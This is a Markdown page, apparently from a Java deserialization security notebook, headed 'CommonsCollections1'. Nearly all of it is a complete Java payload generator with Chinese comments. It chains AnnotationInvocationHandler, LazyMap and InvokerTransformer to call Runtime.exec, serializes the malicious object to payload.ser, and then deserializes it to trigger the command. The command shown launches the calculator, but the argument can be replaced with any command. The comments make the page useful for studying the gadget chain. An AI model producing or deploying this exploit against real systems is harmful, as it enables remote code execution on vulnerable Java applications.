---
description: AnnotationInvocationHandler+LazyMap
---

# CommonsCollections1

PayLoad：

```java
import java.io.*;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;
import com.nqzero.permit.Permit;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import static sun.reflect.misc.FieldUtil.getField;
public class CommonsCollections1 {
    static String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
    //getInvocationHandler用于获取名为handler的InvocationHandler实例，并将map传入成员变量memberValues
    public static InvocationHandler getInvocationHandler(String handler, Map<String, Object> map) throws Exception {
        //获取构造函数
        final Constructor<?> ctor = Class.forName(handler).getDeclaredConstructors()[0];
        //获取handler的私有成员的访问权限，否则会报 can not access a member of class sun.reflect.annotation.AnnotationInvocationHandler
        Permit.setAccessible(ctor);
        //实例化
        return (InvocationHandler) ctor.newInstance(Override.class, map);
    }
    //createMyproxy用于返回handler为ih，代理接口为iface的动态代理对象
    public static <T> T createMyproxy(InvocationHandler ih, Class<T> iface) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, 1);
        allIfaces[0] = iface;
        return iface.cast(Proxy.newProxyInstance(CommonsCollections1.class.getClassLoader(), allIfaces, ih));
    }
    //setFieldValue用于设置obj对象的成员变量fieldName的值为value
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        Field field = null;
        try {
            //获取私有成员变量
            field = obj.getClass().getDeclaredField(fieldName);
            //获取私有成员变量访问权限
            Permit.setAccessible(field);
        }
        catch (NoSuchFieldException ex) {
            if (obj.getClass().getSuperclass() != null)
                field = getField(obj.getClass().getSuperclass(), fieldName);
        }
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        String[] execArgs = new String[]{"calc"};
        // inert chain for setup
        Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(1)});
        // real chain for after setup
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, execArgs),
                new ConstantTransformer(1)};
        //下面这部分为RCE的关键部分代码
        Map innerMap = new HashMap();
        //生成一个lazyMap对象，并将transformerChain赋值给对象的factory成员变量
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        //创建一个Map接口的代理，并且为这个代理设置一个memberValues为lazyMap的AnnotationInvocationHandler
        Map mapProxy = (Map) createMyproxy(getInvocationHandler(ANN_INV_HANDLER_CLASS, lazyMap), Map.class);
        //创建一个memberValues为mapProxy的AnnotationInvocationHandler对象，这个对象也就是我们反序列化利用的恶意对象
        InvocationHandler handler = getInvocationHandler(ANN_INV_HANDLER_CLASS, mapProxy);
        //通过反射的方式进行赋值，即使赋值在生成对象之后也没有关系
        setFieldValue(transformerChain, "iTransformers", transformers);
        //将恶意对象存储为字节码
        FileOutputStream fos = new FileOutputStream("payload.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(handler);
        oos.flush();
        oos.close();
        //读取恶意对象字节码并进行反序列化操作
        FileInputStream fis = new FileInputStream("payload.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object evilObject = ois.readObject();
        ois.close();
    }
}
```



